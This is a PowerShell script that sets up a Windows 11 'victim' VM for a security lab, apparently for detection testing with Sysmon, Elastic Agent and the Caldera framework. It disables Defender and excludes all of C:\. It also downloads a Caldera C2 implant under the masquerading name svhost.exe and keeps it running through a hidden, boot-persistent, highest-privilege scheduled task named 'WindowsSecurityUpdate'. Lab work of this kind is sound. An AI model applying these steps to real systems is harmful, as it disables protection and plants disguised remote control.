# install_win_tools.ps1
# Provisions the Windows 11 victim host:
#   - Disables Windows Defender real-time protection (lab only)
#   - Installs Sysmon with SwiftOnSecurity config
#   - Installs Elastic Agent and enrolls it in Fleet
#
# Reads fleet-enrollment-token.txt written by install_elastic.sh via the
# shared /vagrant (C:\vagrant) folder.

param()

# Transcript first — before anything that can fail
$LogFile = "C:\Windows\Temp\win-victim-provision.log"
Start-Transcript -Path $LogFile -Force

$ErrorActionPreference = "Stop"

function Write-Log {
    param([string]$Message)
    $line = "[win-victim] $Message"
    Write-Host $line
}

$TempDir      = "C:\Windows\Temp\lab-setup"
$SysmonDir    = "$TempDir\Sysmon"
$AgentDir     = "$TempDir\ElasticAgent"
$FleetServer  = "http://192.168.56.10:8220"
$CalderaServer = "http://192.168.56.30:8888"
$TokenFile    = "C:\vagrant\fleet-enrollment-token.txt"

New-Item -ItemType Directory -Force -Path $SysmonDir  | Out-Null
New-Item -ItemType Directory -Force -Path $AgentDir   | Out-Null

# ── 1. Disable Windows Defender (lab only — never do this in production) ──────
Write-Log "Disabling Windows Defender real-time protection..."
try {
    Set-MpPreference -DisableRealtimeMonitoring $true
    Set-MpPreference -DisableIOAVProtection $true
    Set-MpPreference -DisableScriptScanning $true
    # Exclude entire C:\ so Caldera agents and payloads aren't quarantined
    Add-MpPreference -ExclusionPath "C:\"
    Write-Log "Defender disabled and C:\ excluded."
} catch {
    Write-Log "WARNING: Could not fully disable Defender: $_"
}

# ── 2. Disable sleep/hibernate (prevent auto-suspend in headless lab) ─────────
Write-Log "Disabling Windows sleep and hibernate..."
powercfg /change standby-timeout-ac 0 | Out-Null
powercfg /change hibernate-timeout-ac 0 | Out-Null
Write-Log "Sleep disabled."

# ── 3. Install Sysmon ─────────────────────────────────────────────────────────
Write-Log "Downloading Sysmon..."
$SysmonZip    = "$SysmonDir\Sysmon.zip"
$SysmonConfig = "$SysmonDir\sysmonconfig.xml"

# Use curl.exe for all downloads — more reliable than Invoke-WebRequest over WinRM
# 2>$null on all curl calls: progress/stats go to stderr; PS 5.1 with
# $ErrorActionPreference=Stop treats any native-EXE stderr write as NativeCommandError.
& curl.exe -fsSL -o $SysmonZip "https://download.sysinternals.com/files/Sysmon.zip" 2>$null
if ($LASTEXITCODE -ne 0) { Write-Error "Failed to download Sysmon"; exit 1 }

Write-Log "Extracting Sysmon..."
Expand-Archive -Path $SysmonZip -DestinationPath $SysmonDir -Force

Write-Log "Downloading SwiftOnSecurity Sysmon config..."
& curl.exe -fsSL -o $SysmonConfig "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" 2>$null
if ($LASTEXITCODE -ne 0) { Write-Error "Failed to download Sysmon config"; exit 1 }

Write-Log "Installing Sysmon..."
$SysmonExe = if (Test-Path "$SysmonDir\Sysmon64.exe") { "$SysmonDir\Sysmon64.exe" } else { "$SysmonDir\Sysmon.exe" }
$SysmonSvc = Get-Service -Name "Sysmon64" -ErrorAction SilentlyContinue
$sysArgs   = if ($SysmonSvc) {
    Write-Log "Sysmon already installed - updating config only..."
    @("-c", $SysmonConfig)
} else {
    @("-accepteula", "-i", $SysmonConfig)
}
# Use Start-Process so Sysmon's I/O is redirected at the OS level before PS ever
# sees it. Direct invocation (`& $SysmonExe`) or EAP=Continue both still write
# NativeCommandError records to the inner PS stderr, which the WinRM shell
# (EAP=Stop) then terminates on. Start-Process -RedirectStandard* prevents that.
$sysmonOut = "$env:TEMP\sysmon-stdout.tmp"
$sysmonErr = "$env:TEMP\sysmon-stderr.tmp"
$p = Start-Process -FilePath $SysmonExe -ArgumentList $sysArgs `
    -NoNewWindow -Wait -PassThru `
    -RedirectStandardOutput $sysmonOut `
    -RedirectStandardError  $sysmonErr
if ($p.ExitCode -ne 0) {
    $errText = Get-Content $sysmonErr -ErrorAction SilentlyContinue
    Write-Error "Sysmon install/config failed (exit $($p.ExitCode)): $errText"
    exit 1
}
Write-Log "Sysmon installed."

# ── 4. Read Fleet enrollment token ────────────────────────────────────────────
Write-Log "Reading Fleet enrollment token..."
if (-not (Test-Path $TokenFile)) {
    Write-Error "Fleet enrollment token not found at $TokenFile. Ensure elastic-siem was provisioned first."
    exit 1
}

$EnrollToken = (Get-Content $TokenFile -Raw).Trim()
if ([string]::IsNullOrEmpty($EnrollToken)) {
    Write-Error "Fleet enrollment token is empty. Check elastic-siem provisioning logs."
    exit 1
}

Write-Log "Token found."

# Configure private network adapter (VMware does not auto-configure on Windows)
Write-Log "Configuring private network adapter (192.168.56.20/24)..."
$apipa = Get-NetIPAddress -AddressFamily IPv4 | Where-Object IPAddress -like "169.254.*"
if ($apipa) {
    $idx = $apipa[0].InterfaceIndex
    Remove-NetIPAddress -InterfaceIndex $idx -Confirm:$false -ErrorAction SilentlyContinue
    New-NetIPAddress -InterfaceIndex $idx -IPAddress "192.168.56.20" -PrefixLength 24 -ErrorAction SilentlyContinue | Out-Null
    Write-Log "Private adapter configured: 192.168.56.20/24"
}
Write-Log "Network config done."

# ── 5. Install Elastic Agent ──────────────────────────────────────────────────
Write-Log "Downloading Elastic Agent..."
$AgentVersion = "8.19.14"   # Must match elastic-siem version
$AgentZip     = "$AgentDir\elastic-agent.zip"
$AgentUrl     = "https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-${AgentVersion}-windows-x86_64.zip"

# Use curl.exe (native Win10/11) — Invoke-WebRequest drops on large files over WinRM
Write-Log "Fetching: $AgentUrl"
& curl.exe -fsSL -o $AgentZip $AgentUrl 2>$null
if ($LASTEXITCODE -ne 0) {
    Write-Error "curl.exe failed to download Elastic Agent (exit $LASTEXITCODE)"
    exit 1
}

Write-Log "Extracting Elastic Agent..."
Expand-Archive -Path $AgentZip -DestinationPath $AgentDir -Force

# Find the extracted directory (name includes version)
$AgentExtracted = (Get-ChildItem -Path $AgentDir -Directory | Select-Object -First 1).FullName
if (-not $AgentExtracted) {
    Write-Error "Could not find extracted Elastic Agent directory."
    exit 1
}

$ExistingAgent = Get-Service -Name "Elastic Agent" -ErrorAction SilentlyContinue
if ($ExistingAgent) {
    Write-Log "Elastic Agent already installed - skipping install (service: $($ExistingAgent.Status))."
} else {
    Write-Log "Installing and enrolling Elastic Agent..."
    # Use Start-Process (same as Sysmon) to redirect elastic-agent's I/O at OS level.
    # elastic-agent writes TLS/JSON warnings to stderr even on success; the WinRM
    # shell (EAP=Stop) terminates when it sees any stderr from the inner PS process.
    $agentOut = "$env:TEMP\elastic-agent-out.tmp"
    $agentErr = "$env:TEMP\elastic-agent-err.tmp"
    $p = Start-Process -FilePath "$AgentExtracted\elastic-agent.exe" `
        -ArgumentList @("install",
            "--url=$FleetServer",
            "--enrollment-token=$EnrollToken",
            "--insecure",
            "--non-interactive") `
        -NoNewWindow -Wait -PassThru `
        -RedirectStandardOutput $agentOut `
        -RedirectStandardError  $agentErr
    if ($p.ExitCode -ne 0) {
        $errText = Get-Content $agentErr -ErrorAction SilentlyContinue
        Write-Error "elastic-agent install failed (exit $($p.ExitCode)): $errText"
        exit 1
    }
    Write-Log "Elastic Agent installed and enrolled."
}

# ── 6. Verify Elastic Agent service is running ────────────────────────────────
Write-Log "Checking Elastic Agent service status..."
$AgentService = Get-Service -Name "Elastic Agent" -ErrorAction SilentlyContinue
if ($AgentService -and $AgentService.Status -eq "Running") {
    Write-Log "Elastic Agent service is running."
} else {
    Write-Log "WARNING: Elastic Agent service may not be running. Check 'sc query ElasticEndpoint'."
}

# ── 7. Deploy Caldera sandcat agent ──────────────────────────────────────────
Write-Log "Waiting for Caldera C2 to be reachable at $CalderaServer..."
$SandcatPath = "C:\Users\Public\svhost.exe"
$calderaReady = $false
for ($i = 0; $i -lt 18 -and -not $calderaReady; $i++) {
    & curl.exe -s -o "NUL" "$CalderaServer/" 2>$null
    if ($LASTEXITCODE -eq 0) {
        $calderaReady = $true
    } else {
        Write-Log "  Caldera not ready yet (attempt $($i+1)/18), retrying in 10s..."
        Start-Sleep -Seconds 10
    }
}

if (-not $calderaReady) {
    Write-Log "WARNING: Caldera not reachable after 3 minutes. Skipping sandcat deployment."
} else {
    # Stop any running sandcat instance so curl can overwrite the locked binary
    $existingTask = Get-ScheduledTask -TaskName "WindowsSecurityUpdate" -ErrorAction SilentlyContinue
    if ($existingTask) {
        Write-Log "Stopping existing sandcat scheduled task before re-download..."
        Stop-ScheduledTask -TaskName "WindowsSecurityUpdate" -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
    }
    Get-Process -Name "svhost" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

    Write-Log "Caldera reachable. Downloading sandcat agent..."
    & curl.exe -fsSL -o $SandcatPath `
        -H "file: sandcat.go-windows" `
        -H "KEY: ADMIN123" `
        "$CalderaServer/file/download" 2>$null

    if ($LASTEXITCODE -ne 0) {
        Write-Log "WARNING: Failed to download sandcat (exit $LASTEXITCODE). Skipping."
    } else {
        Write-Log "Sandcat downloaded to $SandcatPath. Registering scheduled task..."
        $Action   = New-ScheduledTaskAction -Execute $SandcatPath `
                        -Argument "-server $CalderaServer -group red"
        $Trigger  = New-ScheduledTaskTrigger -AtStartup
        $Settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0 `
                        -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
        Register-ScheduledTask -TaskName "WindowsSecurityUpdate" `
            -Action $Action -Trigger $Trigger -Settings $Settings `
            -RunLevel Highest -Force | Out-Null

        Write-Log "Starting sandcat via scheduled task (survives WinRM session close)..."
        Start-ScheduledTask -TaskName "WindowsSecurityUpdate"
        Write-Log "Sandcat agent running and scheduled to start at boot (task: WindowsSecurityUpdate)."
    }
}

# ── Done ───────────────────────────────────────────────────────────────────────
Write-Log ""
Write-Log "============================================================"
Write-Log "  Windows 11 victim provisioning complete!"
Write-Log "  Sysmon:          running as a service"
Write-Log "  Elastic Agent:   enrolled with Fleet at $FleetServer"
Write-Log "  Caldera C2:      $CalderaServer"
Write-Log "  Sandcat agent:   $SandcatPath (task: WindowsSecurityUpdate)"
Write-Log "============================================================"

Stop-Transcript

# Explicit exit 0: non-terminating error records (e.g. from Sysmon's console writes)
# accumulate in $Error and cause powershell.exe to exit with code 1 unless we
# explicitly signal success here. Real failures already call exit 1 above.
exit 0
